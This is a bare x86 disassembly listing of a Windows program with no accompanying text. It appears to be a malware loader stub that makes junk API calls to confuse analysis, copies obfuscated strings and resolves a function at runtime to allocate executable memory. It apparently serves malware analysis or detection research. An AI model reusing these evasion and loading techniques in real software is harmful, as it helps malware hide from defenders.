0x00401000:	pushl	%ebp	; from: 0x0040141c(MAY)
0x00401001:	movl	%esp, %ebp
0x00401003:	subl	$0x70, %esp
0x00401006:	pushl	%ebx
0x00401007:	movl	$0x0, -32(%ebp)
0x0040100e:	movl	$0x0, -16(%ebp)
0x00401015:	movl	$0x0, -80(%ebp)
0x0040101c:	movl	$0x0, -112(%ebp)
0x00401023:	movl	$0x0, -24(%ebp)
0x0040102a:	movl	$0x0, -28(%ebp)
0x00401031:	movl	$0x0, -12(%ebp)
0x00401038:	movl	$0x0, -8(%ebp)
0x0040103f:	movl	$0x0, -4(%ebp)
0x00401046:	movl	$0x0, -20(%ebp)
0x0040104d:	movl	$0x0, -60(%ebp)
0x00401054:	movl	$0x0, -108(%ebp)
0x0040105b:	movl	$0x0, -72(%ebp)
0x00401062:	movl	$0x0, -76(%ebp)
0x00401069:	movl	$0x0, -68(%ebp)
0x00401070:	movl	$0x0, -56(%ebp)
0x00401077:	movl	$0x0, -64(%ebp)
0x0040107e:	movl	$0x0, -104(%ebp)
0x00401085:	movl	0x0045a7a0, %eax
0x0040108a:	movl	%eax, -100(%ebp)
0x0040108d:	movl	0x0045a7a4, %ecx
0x00401093:	movl	%ecx, -96(%ebp)
0x00401096:	movl	0x0045a7a8, %edx
0x0040109c:	movl	%edx, -92(%ebp)
0x0040109f:	movb	0x0045a7ac, %al
0x004010a4:	movb	%al, -88(%ebp)
0x004010a7:	movl	0x0045a7b0, %ecx
0x004010ad:	movl	%ecx, -48(%ebp)
0x004010b0:	movl	0x0045a7b4, %edx
0x004010b6:	movl	%edx, -44(%ebp)
0x004010b9:	movl	0x0045a7b8, %eax
0x004010be:	movl	%eax, -40(%ebp)
0x004010c1:	movw	0x0045a7bc, %cx
0x004010c8:	movw	%cx, -36(%ebp)
0x004010cc:	movb	0x0045a7be, %dl
0x004010d2:	movb	%dl, -34(%ebp)
0x004010d5:	movl	$0x40, -28(%ebp)
0x004010dc:	pushl	$0x5
0x004010de:	movl	-108(%ebp), %eax
0x004010e1:	pushl	%eax
0x004010e2:	call	ShowWindow@user32.dll	; targets: 0xff0000f0(MAY)
0x004010e8:	leal	-28(%ebp), %ecx
0x004010eb:	pushl	%ecx
0x004010ec:	leal	-16(%ebp), %edx
0x004010ef:	pushl	%edx
0x004010f0:	pushl	$0x4
0x004010f2:	call	CopySid@advapi32.dll	; targets: 0xff000160(MAY)
0x004010f8:	testl	%eax, %eax
0x004010fa:	je	0x0040110c	; targets: 0x0040110c(MAY), 0x004010fc(MAY)
0x004010fc:	pushl	$0x3	; from: 0x004010fa(MAY)
0x004010fe:	pushl	$0x0
0x00401100:	pushl	$0x2
0x00401102:	pushl	$0x1
0x00401104:	pushl	$0x0
0x00401106:	call	AddAce@advapi32.dll	; targets: 0xff000090(MAY)
0x0040110c:	call	GetLastError@kernel32.dll	; targets: 0xff000190(MAY)	; from: 0x004010fa(MAY)
0x00401112:	movl	%eax, -32(%ebp)
0x00401115:	movzwl	-32(%ebp), %eax
0x00401119:	cmpl	$0x7a, %eax
0x0040111c:	jne	0x00401153	; targets: 0x00401153(MAY), 0x0040111e(MAY)
0x0040111e:	movl	$0xe0d, -24(%ebp)	; from: 0x0040111c(MAY)
0x00401125:	movl	$0x3a, -72(%ebp)
0x0040112c:	movb	$0x0, -36(%ebp)
0x00401130:	movl	$0x7bafa337, -4(%ebp)
0x00401137:	pushl	$0x0
0x00401139:	pushl	$0x2
0x0040113b:	pushl	$0xffff
0x00401140:	movl	-108(%ebp), %ecx
0x00401143:	pushl	%ecx
0x00401144:	call	VirtualProtect@kernel32.dll	; targets: 0xff000020(MAY)
0x0040114a:	movl	$0xdceb7, -112(%ebp)
0x00401151:	jmp	0x0040117e	; targets: 0x0040117e(MAY)
0x00401153:	movb	$0x0, 0x00402090	; from: 0x0040111c(MAY)
0x0040115a:	pushl	$0x407fd8
0x0040115f:	call	GetModuleHandleA@kernel32.dll	; targets: 0xff000080(MAY)
0x00401165:	movl	%eax, -32(%ebp)
0x00401168:	pushl	$0x0
0x0040116a:	call	CloseHandle@kernel32.dll	; targets: 0xff0000b0(MAY)
0x00401170:	pushl	$0x402090
0x00401175:	call	GetModuleHandleA@kernel32.dll	; targets: 0xff000080(MAY)
0x0040117b:	movl	%eax, -32(%ebp)
0x0040117e:	pushl	$0x0	; from: 0x00401151(MAY)
0x00401180:	call	GetModuleHandleA@kernel32.dll	; targets: 0xff000080(MAY)
0x00401186:	movl	%eax, -32(%ebp)
0x00401189:	pushl	$0x45a7c0
0x0040118e:	call	GetModuleHandleA@kernel32.dll	; targets: 0xff000080(MAY)
0x00401194:	movl	%eax, -80(%ebp)
0x00401197:	leal	-48(%ebp), %edx
0x0040119a:	pushl	%edx
0x0040119b:	movl	-80(%ebp), %eax
0x0040119e:	pushl	%eax
0x0040119f:	call	GetProcAddress@kernel32.dll	; targets: 0xff000140(MAY)
0x004011a5:	movl	%eax, -52(%ebp)
0x004011a8:	pushl	-28(%ebp)
0x004011ab:	pushl	$0x1000
0x004011b0:	movl	-24(%ebp), %eax
0x004011b3:	addl	$0x46, %eax
0x004011b6:	pushl	%eax
0x004011b7:	pushl	$0x0
0x004011b9:	movl	-52(%ebp), %ebx
0x004011bc:	call	%ebx	; targets: unresolved

start:
0x00401297:	pushl	%ebp
0x00401298:	movl	%esp, %ebp
0x0040129a:	subl	$0x54, %esp
0x0040129d:	movl	$0x0, -52(%ebp)
0x004012a4:	movl	$0x0, -48(%ebp)
0x004012ab:	movl	$0x0, -76(%ebp)
0x004012b2:	movl	$0x0, -80(%ebp)
0x004012b9:	movl	$0x0, -4(%ebp)
0x004012c0:	movl	-76(%ebp), %eax
0x004012c3:	pushl	%eax
0x004012c4:	pushl	$0x0
0x004012c6:	pushl	$0x0
0x004012c8:	movl	-80(%ebp), %ecx
0x004012cb:	pushl	%ecx
0x004012cc:	call	0x00401538	; targets: 0x00401538(MAY)
0x004012d1:	pushl	$0x3
0x004012d3:	pushl	$0x0
0x004012d5:	pushl	$0x18
0x004012d7:	movl	-80(%ebp), %edx
0x004012da:	pushl	%edx
0x004012db:	call	SendMessageA@user32.dll	; targets: 0xff0000a0(MAY)
0x004012e1:	leal	-72(%ebp), %eax
0x004012e4:	pushl	%eax
0x004012e5:	call	GetSystemTime@kernel32.dll	; targets: 0xff000070(MAY)
0x004012eb:	call	GetLastError@kernel32.dll	; targets: 0xff000190(MAY)
0x004012f1:	movl	%eax, -48(%ebp)
0x004012f4:	pushl	$0x8
0x004012f6:	leal	-44(%ebp), %ecx
0x004012f9:	pushl	%ecx
0x004012fa:	call	GetSystemDirectoryA@kernel32.dll	; targets: 0xff000100(MAY)
0x00401300:	pushl	$0xa
0x00401302:	pushl	$0x0
0x00401304:	pushl	$0x0
0x00401306:	pushl	$0xffffffff
0x00401308:	call	0x00401532	; targets: 0x00401532(MAY)
0x0040130d:	movl	-80(%ebp), %edx
0x00401310:	pushl	%edx
0x00401311:	call	DeleteTimerQueue@kernel32.dll	; targets: 0xff000060(MAY)
0x00401317:	movl	-52(%ebp), %eax
0x0040131a:	pushl	%eax
0x0040131b:	call	0x0040136b	; targets: 0x0040136b(MAY)
0x0040136b:	pushl	%ebp	; from: 0x0040131b(MAY)
0x0040136c:	movl	%esp, %ebp
0x0040136e:	subl	$0x3c, %esp
0x00401371:	pushl	%esi
0x00401372:	movl	$0x0, -48(%ebp)
0x00401379:	movl	$0x0, -28(%ebp)
0x00401380:	movl	$0x0, -60(%ebp)
0x00401387:	movl	$0x0, -36(%ebp)
0x0040138e:	movl	$0x0, -56(%ebp)
0x00401395:	movl	$0x0, -40(%ebp)
0x0040139c:	movl	$0x6ac418c5, -36(%ebp)
0x004013a3:	movl	$0x45a7d0, -44(%ebp)
0x004013aa:	pushl	$0x2
0x004013ac:	pushl	$0xa0
0x004013b1:	movl	-60(%ebp), %eax
0x004013b4:	pushl	%eax
0x004013b5:	call	LocalReAlloc@kernel32.dll	; targets: 0xff0000e0(MAY)
0x004013bb:	movl	$0x0, -52(%ebp)
0x004013c2:	movl	-36(%ebp), %ecx
0x004013c5:	movl	%ecx, -32(%ebp)
0x004013c8:	movl	GetLastError@kernel32.dll, %edx
0x004013ce:	movl	%edx, -4(%ebp)
0x004013d1:	cmpl	$0x0, -32(%ebp)
0x004013d5:	je	0x004013dd	; targets: 0x004013d7(MAY)
0x004013d7:	cmpl	$0x0, -4(%ebp)	; from: 0x004013d5(MAY)
0x004013db:	jne	0x004013e5	; targets: 0x004013e5(MAY)
0x004013e5:	pushl	$0xa	; from: 0x004013db(MAY)
0x004013e7:	call	Sleep@kernel32.dll	; targets: 0xff000040(MAY)
0x004013ed:	pushl	$0x8000
0x004013f2:	pushl	$0x0
0x004013f4:	movl	-60(%ebp), %eax
0x004013f7:	pushl	%eax
0x004013f8:	pushl	$0xffffffff
0x004013fa:	call	VirtualFreeEx@kernel32.dll	; targets: 0xff000130(MAY)
0x00401400:	testl	%eax, %eax
0x00401402:	je	0x00401410	; targets: 0x00401410(MAY), 0x00401404(MAY)
0x00401404:	pushl	$0x1	; from: 0x00401402(MAY)
0x00401406:	movl	-60(%ebp), %ecx
0x00401409:	pushl	%ecx
0x0040140a:	call	CreateDIBPatternBrushPt@gdi32.dll	; targets: 0xff0001b0(MAY)
0x00401410:	movl	-4(%ebp), %esi	; from: 0x00401402(MAY)
0x00401413:	call	%esi	; targets: 0xff000190(MAY)
0x00401415:	movl	%eax, -60(%ebp)
0x00401418:	movl	-32(%ebp), %edx
0x0040141b:	pushl	%edx
0x0040141c:	call	0x00401000	; targets: 0x00401000(MAY)
0x00401532:	jmp	GetModuleBaseNameA@psapi.dll	; targets: 0xff000010(MAY)	; from: 0x00401308(MAY)
0x00401538:	jmp	GetModuleInformation@psapi.dll	; targets: 0xff000030(MAY)	; from: 0x004012cc(MAY)
